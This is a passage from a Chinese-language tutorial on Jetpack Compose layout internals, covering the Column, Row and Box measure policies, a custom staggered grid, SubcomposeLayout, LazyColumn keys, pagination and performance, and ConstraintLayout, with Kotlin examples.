    content: @<span class="hljs-type">Composable</span> <span class="hljs-type">ColumnScope</span>.() -&gt; <span class="hljs-type">Unit</span>
)</span></span> {
    <span class="hljs-keyword">val</span> measurePolicy = columnMeasurePolicy(
        verticalArrangement = verticalArrangement,
        horizontalAlignment = horizontalAlignment
    )
    
    Layout(
        content = { ColumnScopeInstance.content() },
        measurePolicy = measurePolicy,
        modifier = modifier
    )
}

<span class="hljs-comment">// Column 的测量策略</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">columnMeasurePolicy</span><span class="hljs-params">(
    verticalArrangement: <span class="hljs-type">Arrangement</span>.<span class="hljs-type">Vertical</span>,
    horizontalAlignment: <span class="hljs-type">Alignment</span>.<span class="hljs-type">Horizontal</span>
)</span></span>: MeasurePolicy = MeasurePolicy { measurables, constraints -&gt;
    <span class="hljs-comment">// 1. 测量所有子元素</span>
    <span class="hljs-keyword">val</span> placeables = measurables.map { measurable -&gt;
        measurable.measure(constraints)
    }
    
    <span class="hljs-comment">// 2. 计算 Column 的尺寸</span>
    <span class="hljs-keyword">val</span> width = placeables.maxOf { it.width }
        .coerceIn(constraints.minWidth, constraints.maxWidth)
    
    <span class="hljs-keyword">val</span> height = placeables.sumOf { it.height }
        .coerceIn(constraints.minHeight, constraints.maxHeight)
    
    <span class="hljs-comment">// 3. 计算垂直位置（根据 Arrangement）</span>
    <span class="hljs-keyword">val</span> positions = verticalArrangement.arrange(
        totalSize = height,
        sizes = placeables.map { it.height },
        layoutDirection = layoutDirection
    )
    
    <span class="hljs-comment">// 4. 布局</span>
    layout(width, height) {
        placeables.forEachIndexed { index, placeable -&gt;
            <span class="hljs-comment">// 计算水平位置（根据 Alignment）</span>
            <span class="hljs-keyword">val</span> x = horizontalAlignment.align(
                size = placeable.width,
                space = width,
                layoutDirection = layoutDirection
            )
            placeable.placeRelative(x, positions[index])
        }
    }
}
</code></pre>
<p><strong>关键设计</strong>：</p>
<ul>
<li>Column 给子元素的约束是<strong>完整的父约束</strong>，子元素可以决定自己的高度</li>
<li>Column 的总高度是子元素高度之和</li>
<li>Arrangement 决定子元素的垂直分布</li>
<li>Alignment 决定子元素的水平对齐</li>
</ul>
<h3 data-id="heading-28">2.6 Row 的测量与布局原理</h3>
<p>Row 与 Column 类似，只是方向不同：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Row 的测量策略</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">rowMeasurePolicy</span><span class="hljs-params">(
    horizontalArrangement: <span class="hljs-type">Arrangement</span>.<span class="hljs-type">Horizontal</span>,
    verticalAlignment: <span class="hljs-type">Alignment</span>.<span class="hljs-type">Vertical</span>
)</span></span>: MeasurePolicy = MeasurePolicy { measurables, constraints -&gt;
    <span class="hljs-comment">// 1. 测量所有子元素</span>
    <span class="hljs-keyword">val</span> placeables = measurables.map { measurable -&gt;
        measurable.measure(constraints)
    }
    
    <span class="hljs-comment">// 2. 计算 Row 的尺寸</span>
    <span class="hljs-keyword">val</span> width = placeables.sumOf { it.width }
        .coerceIn(constraints.minWidth, constraints.maxWidth)
    
    <span class="hljs-keyword">val</span> height = placeables.maxOf { it.height }
        .coerceIn(constraints.minHeight, constraints.maxHeight)
    
    <span class="hljs-comment">// 3. 计算水平位置（根据 Arrangement）</span>
    <span class="hljs-keyword">val</span> positions = horizontalArrangement.arrange(
        totalSize = width,
        sizes = placeables.map { it.width },
        layoutDirection = layoutDirection
    )
    
    <span class="hljs-comment">// 4. 布局</span>
    layout(width, height) {
        placeables.forEachIndexed { index, placeable -&gt;
            <span class="hljs-comment">// 计算垂直位置（根据 Alignment）</span>
            <span class="hljs-keyword">val</span> y = verticalAlignment.align(
                size = placeable.height,
                space = height
            )
            placeable.placeRelative(positions[index], y)
        }
    }
}
</code></pre>
<h3 data-id="heading-29">2.7 Box 的测量与布局原理</h3>
<p>Box 是层叠布局，子元素可以重叠：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Box 的测量策略</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">boxMeasurePolicy</span><span class="hljs-params">(alignment: <span class="hljs-type">Alignment</span>)</span></span>: MeasurePolicy = 
    MeasurePolicy { measurables, constraints -&gt;
        <span class="hljs-comment">// 1. 测量所有子元素</span>
        <span class="hljs-keyword">val</span> placeables = measurables.map { measurable -&gt;
            measurable.measure(constraints)
        }
        
        <span class="hljs-comment">// 2. 计算 Box 的尺寸</span>
        <span class="hljs-keyword">val</span> width = placeables.maxOf { it.width }
            .coerceIn(constraints.minWidth, constraints.maxWidth)
        
        <span class="hljs-keyword">val</span> height = placeables.maxOf { it.height }
            .coerceIn(constraints.minHeight, constraints.maxHeight)
        
        <span class="hljs-comment">// 3. 布局（所有子元素都使用相同的对齐方式）</span>
        layout(width, height) {
            placeables.forEach { placeable -&gt;
                <span class="hljs-keyword">val</span> x = alignment.align(
                    size = placeable.width,
                    space = width,
                    layoutDirection = layoutDirection
                )
                <span class="hljs-keyword">val</span> y = alignment.align(
                    size = placeable.height,
                    space = height
                )
                placeable.placeRelative(x, y)
            }
        }
    }
</code></pre>
<p><strong>Box 的特殊之处</strong>：</p>
<ul>
<li>所有子元素都测量为最大尺寸</li>
<li>子元素默认使用 contentAlignment 对齐</li>
<li>可以单独指定子元素的对齐方式（使用 Modifier.align）</li>
</ul>
<h3 data-id="heading-30">2.8 自定义 Layout 的设计思路</h3>
<h4 data-id="heading-31">2.8.1 设计自定义布局的步骤</h4>
<ol>
<li><strong>明确需求</strong>：要实现什么样的布局效果？</li>
<li><strong>确定约束</strong>：子元素的尺寸如何确定？</li>
<li><strong>设计测量策略</strong>：如何测量子元素？</li>
<li><strong>设计布局策略</strong>：子元素如何排列？</li>
</ol>
<h4 data-id="heading-32">2.8.2 实战：自定义瀑布流布局</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/**
 * 瀑布流布局（StaggeredGrid）
 * 
 * 设计思路：
 * 1. 将子元素分配到多列中
 * 2. 每列独立计算高度
 * 3. 新元素添加到最短的列
 */</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">StaggeredGrid</span><span class="hljs-params">(
    columns: <span class="hljs-type">Int</span> = <span class="hljs-number">2</span>,
    horizontalGap: <span class="hljs-type">Dp</span> = <span class="hljs-number">8.</span>dp,
    verticalGap: <span class="hljs-type">Dp</span> = <span class="hljs-number">8.</span>dp,
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    content: @<span class="hljs-type">Composable</span> () -&gt; <span class="hljs-type">Unit</span>
)</span></span> {
    Layout(
        content = content,
        modifier = modifier
    ) { measurables, constraints -&gt;
        <span class="hljs-keyword">val</span> hGapPx = horizontalGap.roundToPx()
        <span class="hljs-keyword">val</span> vGapPx = verticalGap.roundToPx()
        
        <span class="hljs-comment">// 计算每列的宽度</span>
        <span class="hljs-keyword">val</span> columnWidth = (constraints.maxWidth - (columns - <span class="hljs-number">1</span>) * hGapPx) / columns
        
        <span class="hljs-comment">// 创建列高度追踪器</span>
        <span class="hljs-keyword">val</span> columnHeights = IntArray(columns) { <span class="hljs-number">0</span> }
        
        <span class="hljs-comment">// 存储每个子元素的位置信息</span>
        <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ItemInfo</span>(
            <span class="hljs-keyword">val</span> placeable: Placeable,
            <span class="hljs-keyword">val</span> column: <span class="hljs-built_in">Int</span>,
            <span class="hljs-keyword">val</span> x: <span class="hljs-built_in">Int</span>,
            <span class="hljs-keyword">val</span> y: <span class="hljs-built_in">Int</span>
        )
        
        <span class="hljs-keyword">val</span> itemInfos = mutableListOf&lt;ItemInfo&gt;()
        
        <span class="hljs-comment">// 测量并放置每个子元素</span>
        measurables.forEach { measurable -&gt;
            <span class="hljs-comment">// 测量子元素（宽度固定为列宽，高度不限）</span>
            <span class="hljs-keyword">val</span> placeable = measurable.measure(
                Constraints.fixedWidth(columnWidth)
            )
            
            <span class="hljs-comment">// 找到最短的列</span>
            <span class="hljs-keyword">val</span> shortestColumn = columnHeights.indices.minByOrNull { columnHeights[it] } ?: <span class="hljs-number">0</span>
            
            <span class="hljs-comment">// 计算位置</span>
            <span class="hljs-keyword">val</span> x = shortestColumn * (columnWidth + hGapPx)
            <span class="hljs-keyword">val</span> y = columnHeights[shortestColumn]
            
            <span class="hljs-comment">// 更新列高度</span>
            columnHeights[shortestColumn] += placeable.height + vGapPx
            
            itemInfos.add(ItemInfo(placeable, shortestColumn, x, y))
        }
        
        <span class="hljs-comment">// 计算总高度（最高列的高度）</span>
        <span class="hljs-keyword">val</span> totalHeight = columnHeights.maxOrNull()?.let { 
            it - vGapPx  <span class="hljs-comment">// 减去最后一个间隙</span>
        } ?: <span class="hljs-number">0</span>
        
        <span class="hljs-comment">// 布局</span>
        layout(constraints.maxWidth, totalHeight.coerceIn(constraints.minHeight, constraints.maxHeight)) {
            itemInfos.forEach { info -&gt;
                info.placeable.placeRelative(info.x, info.y)
            }
        }
    }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">StaggeredGridDemo</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> items = listOf(
        <span class="hljs-string">"短文本"</span> to <span class="hljs-number">80</span>,
        <span class="hljs-string">"这是一个比较长的文本内容"</span> to <span class="hljs-number">120</span>,
        <span class="hljs-string">"中等"</span> to <span class="hljs-number">100</span>,
        <span class="hljs-string">"很长很长很长的文本内容在这里"</span> to <span class="hljs-number">150</span>,
        <span class="hljs-string">"短"</span> to <span class="hljs-number">60</span>,
    )
    
    StaggeredGrid(
        columns = <span class="hljs-number">2</span>,
        horizontalGap = <span class="hljs-number">8.</span>dp,
        verticalGap = <span class="hljs-number">8.</span>dp,
        modifier = Modifier.fillMaxWidth()
    ) {
        items.forEach { (text, height) -&gt;
            Card(
                modifier = Modifier.height(height.dp)
            ) {
                Text(
                    text = text,
                    modifier = Modifier.padding(<span class="hljs-number">8.</span>dp)
                )
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-33">2.9 SubcomposeLayout：延迟组合</h3>
<p>SubcomposeLayout 允许在测量阶段动态创建子元素，这在某些场景下非常有用。</p>
<h4 data-id="heading-34">2.9.1 使用场景</h4>
<ol>
<li><strong>根据测量结果决定子元素内容</strong></li>
<li><strong>实现复杂的自适应布局</strong></li>
<li><strong>动态加载内容</strong></li>
</ol>
<h4 data-id="heading-35">2.9.2 实战：响应式文本</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/**
 * 响应式文本：根据可用宽度自动调整字体大小
 */</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ResponsiveText</span><span class="hljs-params">(
    text: <span class="hljs-type">String</span>,
    modifier: <span class="hljs-type">Modifier</span> = Modifier,
    minFontSize: <span class="hljs-type">TextUnit</span> = <span class="hljs-number">12.</span>sp,
    maxFontSize: <span class="hljs-type">TextUnit</span> = <span class="hljs-number">48.</span>sp
)</span></span> {
    SubcomposeLayout(modifier = modifier) { constraints -&gt;
        <span class="hljs-keyword">var</span> fontSize = maxFontSize
        <span class="hljs-keyword">var</span> placeable: Placeable? = <span class="hljs-literal">null</span>
        
        <span class="hljs-comment">// 二分查找合适的字体大小</span>
        <span class="hljs-keyword">while</span> (fontSize &gt;= minFontSize) {
            <span class="hljs-keyword">val</span> measurable = subcompose(<span class="hljs-string">"text_<span class="hljs-variable">$fontSize</span>"</span>) {
                Text(
                    text = text,
                    fontSize = fontSize,
                    maxLines = <span class="hljs-number">1</span>
                )
            }[<span class="hljs-number">0</span>]
            
            <span class="hljs-keyword">val</span> testPlaceable = measurable.measure(constraints)
            
            <span class="hljs-keyword">if</span> (testPlaceable.width &lt;= constraints.maxWidth) {
                placeable = testPlaceable
                <span class="hljs-keyword">break</span>
            }
            
            fontSize *= <span class="hljs-number">0.9f</span>
        }
        
        placeable = placeable ?: subcompose(<span class="hljs-string">"text_min"</span>) {
            Text(text = text, fontSize = minFontSize, maxLines = <span class="hljs-number">1</span>)
        }[<span class="hljs-number">0</span>].measure(constraints)
        
        layout(placeable.width, placeable.height) {
            placeable.placeRelative(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
        }
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-36">三、LazyColumn 深度解析：惰性加载的艺术</h2>
<h3 data-id="heading-37">3.1 为什么需要惰性加载？</h3>
<p>假设我们要显示 10000 条数据的列表：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 使用普通 Column - 会创建 10000 个 Text 组件！</span>
Column {
    repeat(<span class="hljs-number">10000</span>) { index -&gt;
        Text(<span class="hljs-string">"Item <span class="hljs-variable">$index</span>"</span>)
    }
}
</code></pre>
<p><strong>问题</strong>：</p>
<ul>
<li>内存占用：10000 个 Text 组件同时存在</li>
<li>首次加载：需要测量和布局所有 item</li>
<li>滑动性能：大量视图参与绘制</li>
</ul>
<h3 data-id="heading-38">3.2 LazyColumn 的解决方案</h3>
<p>LazyColumn 采用<strong>视口渲染 + 对象池复用</strong>策略：</p>
<pre><code class="hljs language-scss" lang="scss">┌────────────────────────────────────────────────────────────────┐
│                     LazyColumn 视口                            │
│                                                                │
│  ┌──────────────────────────────────────────────────────┐     │
│  │                    可见区域 (Viewport)                  │     │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐  │     │
│  │  │ Item <span class="hljs-number">5</span>  │  │ Item <span class="hljs-number">6</span>  │  │ Item <span class="hljs-number">7</span>  │  │ Item <span class="hljs-number">8</span>  │  │     │
│  │  │ (可见)  │  │ (可见)  │  │ (可见)  │  │ (可见)  │  │     │
│  │  └─────────┘  └─────────┘  └─────────┘  └─────────┘  │     │
│  └──────────────────────────────────────────────────────┘     │
│                                                                │
│  Item <span class="hljs-number">1</span>-<span class="hljs-number">4</span>: 已滑出视口，组件被回收，状态保存                      │
│  Item <span class="hljs-number">9</span>+:  未进入视口，组件未创建                                │
│                                                                │
└────────────────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-39">3.3 LazyColumn 的架构设计</h3>
<pre><code class="hljs language-scss" lang="scss">LazyColumn
├── LazyListState          (状态管理)
│   ├── firstVisibleItemIndex
│   ├── firstVisibleItemScrollOffset
│   └── layoutInfo
├── LazyListLayoutInfo     (布局信息)
│   ├── visibleItemsInfo   (可见 item 信息)
│   ├── totalItemsCount
│   └── viewportSize
└── LazyListItemProvider   (Item 提供器)
    └── itemProvider       (根据索引创建 item)
</code></pre>
<h3 data-id="heading-40">3.4 测量与布局流程</h3>
<p>LazyColumn 的测量流程与普通 Layout 不同：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// LazyColumn 的测量策略（简化版）</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">measureLazyList</span><span class="hljs-params">(constraints: <span class="hljs-type">Constraints</span>)</span></span>: MeasureResult {
    <span class="hljs-comment">// 1. 计算视口大小</span>
    <span class="hljs-keyword">val</span> viewportWidth = constraints.maxWidth
    <span class="hljs-keyword">val</span> viewportHeight = constraints.maxHeight
    
    <span class="hljs-comment">// 2. 确定可见 item 范围</span>
    <span class="hljs-keyword">val</span> firstVisibleIndex = calculateFirstVisibleItem()
    <span class="hljs-keyword">val</span> lastVisibleIndex = calculateLastVisibleItem(viewportHeight)
    
    <span class="hljs-comment">// 3. 测量可见 item</span>
    <span class="hljs-keyword">val</span> visiblePlaceables = mutableListOf&lt;Placeable&gt;()
    <span class="hljs-keyword">for</span> (index <span class="hljs-keyword">in</span> firstVisibleIndex..lastVisibleIndex) {
        <span class="hljs-keyword">val</span> placeable = measureItem(index, constraints)
        visiblePlaceables.add(placeable)
    }
    
    <span class="hljs-comment">// 4. 计算总高度（预估）</span>
    <span class="hljs-keyword">val</span> totalHeight = <span class="hljs-keyword">if</span> (hasMoreItems) {
        estimateTotalHeight()
    } <span class="hljs-keyword">else</span> {
        visiblePlaceables.sumOf { it.height }
    }
    
    <span class="hljs-comment">// 5. 布局</span>
    <span class="hljs-keyword">return</span> layout(viewportWidth, totalHeight) {
        <span class="hljs-keyword">var</span> y = -scrollOffset
        visiblePlaceables.forEach { placeable -&gt;
            placeable.placeRelative(<span class="hljs-number">0</span>, y)
            y += placeable.height
        }
    }
}
</code></pre>
<h3 data-id="heading-41">3.5 key 的作用与 diff 算法</h3>
<h4 data-id="heading-42">3.5.1 为什么需要 key？</h4>
<p>当列表数据变化时，Compose 需要知道：</p>
<ul>
<li>哪些 item 是新增的？</li>
<li>哪些 item 被删除了？</li>
<li>哪些 item 移动了位置？</li>
</ul>
<p><strong>没有 key 的问题</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 假设列表初始状态</span>
items = [A, B, C]

<span class="hljs-comment">// 删除 A 后</span>
items = [B, C]

<span class="hljs-comment">// 没有 key 时，Compose 会认为：</span>
<span class="hljs-comment">// - 位置 0 的内容从 A 变成了 B</span>
<span class="hljs-comment">// - 位置 1 的内容从 B 变成了 C</span>
<span class="hljs-comment">// - 位置 2 被删除</span>
<span class="hljs-comment">// 结果是：B 和 C 都会重组，状态丢失！</span>
</code></pre>
<p><strong>有 key 时</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">items(items, key = { it.id }) { item -&gt;
    ItemCard(item)
}

<span class="hljs-comment">// 删除 A 后</span>
<span class="hljs-comment">// Compose 知道：</span>
<span class="hljs-comment">// - A 被删除了</span>
<span class="hljs-comment">// - B 和 C 只是位置变了</span>
<span class="hljs-comment">// 结果是：只有 A 的组件被销毁，B 和 C 只是移动位置</span>
</code></pre>
<h4 data-id="heading-43">3.5.2 key 的 diff 算法</h4>
<p>Compose 使用类似 React 的 diff 算法：</p>
<pre><code class="hljs language-ini" lang="ini">旧列表: <span class="hljs-section">[A(key=1), B(key=2), C(key=3)]</span>
新列表: <span class="hljs-section">[B(key=2), C(key=3), D(key=4)]</span>

Diff 结果:
<span class="hljs-attr">1. key</span>=<span class="hljs-number">1</span> 的 A 不在新列表中 → 删除 A
<span class="hljs-attr">2. key</span>=<span class="hljs-number">2</span> 的 B 在位置 <span class="hljs-number">0</span> → 移动到位置 <span class="hljs-number">0</span>
<span class="hljs-attr">3. key</span>=<span class="hljs-number">3</span> 的 C 在位置 <span class="hljs-number">1</span> → 移动到位置 <span class="hljs-number">1</span>  
<span class="hljs-attr">4. key</span>=<span class="hljs-number">4</span> 的 D 是新元素 → 创建 D
</code></pre>
<h3 data-id="heading-44">3.6 列表状态管理</h3>
<h4 data-id="heading-45">3.6.1 记住滚动位置</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">LazyColumnWithState</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// rememberLazyListState 会自动保存和恢复滚动位置</span>
    <span class="hljs-keyword">val</span> listState = rememberLazyListState()
    
    LazyColumn(state = listState) {
        items(<span class="hljs-number">1000</span>) { index -&gt;
            Text(<span class="hljs-string">"Item <span class="hljs-variable">$index</span>"</span>)
        }
    }
    
    <span class="hljs-comment">// 滚动到指定位置</span>
    LaunchedEffect(<span class="hljs-built_in">Unit</span>) {
        listState.scrollToItem(<span class="hljs-number">100</span>)
    }
    
    <span class="hljs-comment">// 平滑滚动</span>
    scope.launch {
        listState.animateScrollToItem(<span class="hljs-number">100</span>)
    }
}
</code></pre>
<h4 data-id="heading-46">3.6.2 监听滚动状态</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">LazyColumnWithScrollListener</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> listState = rememberLazyListState()
    
    <span class="hljs-comment">// 使用 derivedStateOf 优化频繁变化的状态</span>
    <span class="hljs-keyword">val</span> firstVisibleItem <span class="hljs-keyword">by</span> remember {
        derivedStateOf { listState.firstVisibleItemIndex }
    }
    
    <span class="hljs-keyword">val</span> isScrolling <span class="hljs-keyword">by</span> remember {
        derivedStateOf { listState.isScrollInProgress }
    }
    
    <span class="hljs-comment">// 判断是否滑到底部</span>
    <span class="hljs-keyword">val</span> isAtBottom <span class="hljs-keyword">by</span> remember {
        derivedStateOf {
            <span class="hljs-keyword">val</span> layoutInfo = listState.layoutInfo
            <span class="hljs-keyword">val</span> visibleItems = layoutInfo.visibleItemsInfo
            <span class="hljs-keyword">val</span> lastVisibleItem = visibleItems.lastOrNull()
            
            lastVisibleItem != <span class="hljs-literal">null</span> &amp;&amp; 
            lastVisibleItem.index &gt;= layoutInfo.totalItemsCount - <span class="hljs-number">1</span>
        }
    }
    
    LazyColumn(state = listState) {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<h3 data-id="heading-47">3.7 分页加载实现</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">PaginatedList</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> listState = rememberLazyListState()
    <span class="hljs-keyword">var</span> items <span class="hljs-keyword">by</span> remember { mutableStateOf&lt;List&lt;Item&gt;&gt;(emptyList()) }
    <span class="hljs-keyword">var</span> isLoading <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">false</span>) }
    <span class="hljs-keyword">var</span> hasMore <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">true</span>) }
    
    <span class="hljs-comment">// 监听是否需要加载更多</span>
    <span class="hljs-keyword">val</span> shouldLoadMore <span class="hljs-keyword">by</span> remember {
        derivedStateOf {
            <span class="hljs-keyword">val</span> layoutInfo = listState.layoutInfo
            <span class="hljs-keyword">val</span> visibleItems = layoutInfo.visibleItemsInfo
            <span class="hljs-keyword">val</span> lastVisibleItem = visibleItems.lastOrNull()
            
            <span class="hljs-comment">// 当最后一个可见 item 是倒数第 5 个时，开始加载</span>
            lastVisibleItem != <span class="hljs-literal">null</span> &amp;&amp;
            lastVisibleItem.index &gt;= layoutInfo.totalItemsCount - <span class="hljs-number">5</span> &amp;&amp;
            !isLoading &amp;&amp; hasMore
        }
    }
    
    <span class="hljs-comment">// 加载数据</span>
    LaunchedEffect(shouldLoadMore) {
        <span class="hljs-keyword">if</span> (shouldLoadMore) {
            isLoading = <span class="hljs-literal">true</span>
            <span class="hljs-keyword">val</span> newItems = repository.loadMore(items.size, pageSize = <span class="hljs-number">20</span>)
            items = items + newItems
            hasMore = newItems.size &gt;= <span class="hljs-number">20</span>
            isLoading = <span class="hljs-literal">false</span>
        }
    }
    
    LazyColumn(state = listState) {
        items(items, key = { it.id }) { item -&gt;
            ItemCard(item)
        }
        
        <span class="hljs-keyword">if</span> (isLoading) {
            item {
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(<span class="hljs-number">16.</span>dp),
                    contentAlignment = Alignment.Center
                ) {
                    CircularProgressIndicator()
                }
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-48">3.8 性能优化最佳实践</h3>
<h4 data-id="heading-49">3.8.1 使用 key</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ✅ 正确：使用 key</span>
items(dataList, key = { it.id }) { item -&gt;
    ItemCard(item)
}

<span class="hljs-comment">// ❌ 错误：不使用 key</span>
items(dataList) { item -&gt;
    ItemCard(item)
}
</code></pre>
<h4 data-id="heading-50">3.8.2 避免在 item 中创建新的对象</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ❌ 错误：每次重组都创建新的 lambda</span>
items(dataList, key = { it.id }) { item -&gt;
    ItemCard(
        item = item,
        onClick = { viewModel.onItemClick(item) }  <span class="hljs-comment">// 每次重组都创建</span>
    )
}

<span class="hljs-comment">// ✅ 正确：使用 remember 缓存 lambda</span>
items(dataList, key = { it.id }) { item -&gt;
    <span class="hljs-keyword">val</span> onClick = remember(item.id) {
        { viewModel.onItemClick(item) }
    }
    ItemCard(item = item, onClick = onClick)
}
</code></pre>
<h4 data-id="heading-51">3.8.3 使用 contentType 优化不同类型 item</h4>
<pre><code class="hljs language-kotlin" lang="kotlin">LazyColumn {
    items(
        items = mixedList,
        key = { it.id },
        contentType = { it.type }  <span class="hljs-comment">// 帮助 Compose 复用 item</span>
    ) { item -&gt;
        <span class="hljs-keyword">when</span> (item.type) {
            Type.HEADER -&gt; HeaderItem(item)
            Type.CONTENT -&gt; ContentItem(item)
            Type.FOOTER -&gt; FooterItem(item)
        }
    }
}
</code></pre>
<h4 data-id="heading-52">3.8.4 合理使用 remember 缓存计算</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ItemCard</span><span class="hljs-params">(item: <span class="hljs-type">Item</span>)</span></span> {
    <span class="hljs-comment">// ✅ 缓存格式化后的价格</span>
    <span class="hljs-keyword">val</span> formattedPrice = remember(item.price) {
        NumberFormat.getCurrencyInstance().format(item.price)
    }
    
    <span class="hljs-comment">// ✅ 缓存渐变 Brush</span>
    <span class="hljs-keyword">val</span> gradient = remember(item.color) {
        Brush.linearGradient(
            colors = listOf(item.color, item.color.copy(alpha = <span class="hljs-number">0.5f</span>))
        )
    }
    
    Text(text = formattedPrice)
}
</code></pre>
<hr/>
<h2 data-id="heading-53">四、ConstraintLayout 深度解析</h2>
<h3 data-id="heading-54">4.1 ConstraintLayout 的设计哲学</h3>
<p>ConstraintLayout 的核心思想是<strong>通过约束条件描述布局</strong>，而不是通过嵌套层次。</p>
<p><strong>优势</strong>：</p>
<ul>
<li>扁平的视图层级（通常只有一层）</li>
<li>灵活的相对定位</li>
<li>更好的性能（减少测量次数）</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>复杂的表单页面</li>
<li>需要相对定位的布局</li>
<li>需要动态调整位置的元素</li>
</ul>
<h3 data-id="heading-55">4.2 约束求解原理</h3>
<p>ConstraintLayout 的布局过程可以看作是一个<strong>约束求解问题</strong>：</p>
<pre><code class="hljs language-css" lang="css">变量：每个 View 的 x, y, <span class="hljs-attribute">width</span>, <span class="hljs-attribute">height</span>
约束条件：
  - View <span class="hljs-selector-tag">A</span> 的左边与父布局左边对齐
  - View <span class="hljs-selector-tag">B</span> 的左边与 View <span class="hljs-selector-tag">A</span> 的右边对齐
  - View C 在父布局中水平居中
  - ...

求解目标：找到满足所有约束的 x, y, <span class="hljs-attribute">width</span>, <span class="hljs-attribute">height</span>
</code></pre>
<h3 data-id="heading-56">4.3 与嵌套布局的选择策略</h3>



































<table><thead><tr><th>场景</th><th>推荐方案</th><th>理由</th></tr></thead><tbody><tr><td>简单线性排列</td><td>Column/Row</td><td>代码更简洁，语义更清晰</td></tr><tr><td>需要相对定位</td><td>ConstraintLayout</td><td>减少嵌套层级</td></tr><tr><td>复杂表单</td><td>ConstraintLayout</td><td>标签和输入框对齐更方便</td></tr><tr><td>列表项</td><td>Column/Row</td><td>性能更好，代码更易读</td></tr><tr><td>需要动态位置</td><td>ConstraintLayout</td><td>约束可以动态修改</td></tr></tbody></table>
<h3 data-id="heading-57">4.4 性能对比</h3>
<pre><code class="hljs language-diff" lang="diff">场景：一个包含 10 个子元素的复杂布局

嵌套 Column + Row:
<span class="hljs-deletion">- 测量次数：O(n²) 级别</span>
<span class="hljs-deletion">- 视图层级：3-4 层</span>

ConstraintLayout:
<span class="hljs-deletion">- 测量次数：O(n) 级别</span>
<span class="hljs-deletion">- 视图层级：1 层</span>
</code></pre>
<p><strong>建议</strong>：</p>
<ul>
<li>简单布局优先使用 Column/Row</li>
<li>复杂布局考虑 ConstraintLayout</li>
<li>不要过度优化，先保证代码可读性</li>
</ul>
<hr/>
<h2 data-id="heading-58">五、常见问题与解决方案</h2>
<h3 data-id="heading-59">5.1 Modifier 相关问题</h3>
<p><strong>Q: 为什么 Modifier.padding() 和 Modifier.background() 的顺序会影响效果？</strong></p>
<p>A: 因为 Modifier 是从外到内执行的。先应用的 Modifier 在外层，后应用的在内层。</p>
<p><strong>Q: 如何实现点击区域比实际 View 大？</strong></p>
<p>A: 使用 <code>Modifier.clickable</code> 配合 <code>Modifier.padding</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">Box(
    modifier = Modifier
        .clickable { <span class="hljs-comment">/* 点击处理 */</span> }
        .padding(<span class="hljs-number">16.</span>dp)  <span class="hljs-comment">// 点击区域包含 padding</span>
        .background(Color.Blue)
) {
    Text(<span class="hljs-string">"Click me"</span>)
}
</code></pre>
<h3 data-id="heading-60">5.2 布局相关问题</h3>
<p><strong>Q: 如何实现宽高比固定的组件？</strong></p>
<p>A: 使用 <code>AspectRatio</code> Modifier：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">Image(
    painter = painterResource(R.drawable.image),
    contentDescription = <span class="hljs-literal">null</span>,
    modifier = Modifier.aspectRatio(<span class="hljs-number">16f</span> / <span class="hljs-number">9f</span>)
)
</code></pre>
<p><strong>Q: 如何让子元素填满剩余空间？</strong></p>
<p>A: 使用 <code>Modifier.weight</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">Column {
    Text(<span class="hljs-string">"Header"</span>)
    Box(
        modifier = Modifier
            .fillMaxWidth()
